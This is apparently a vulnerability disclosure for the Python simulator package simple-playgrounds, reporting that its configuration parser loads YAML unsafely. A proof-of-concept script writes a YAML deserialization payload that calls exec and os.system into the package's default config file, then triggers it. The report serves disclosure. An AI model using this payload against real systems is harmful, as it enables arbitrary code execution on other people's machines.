# Description

`simple-playgrounds` is a simulator for Reinforcement Learning and AI. 2D environments with physics and interactive entities, which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip3 install simple_playgrounds
```

### Run exploit.py
```
import os
from simple_playgrounds.playgrounds import playground
#os.system('pip3 install simple_playgrounds')
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
os.chdir('/home/anon/huntr-venv/lib/python3.8/site-packages/simple_playgrounds/playgrounds/configs')
open('playground_default.yml','w+').write(payload)
playground.Playground.parse_configuration('playground_default.yml')

```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
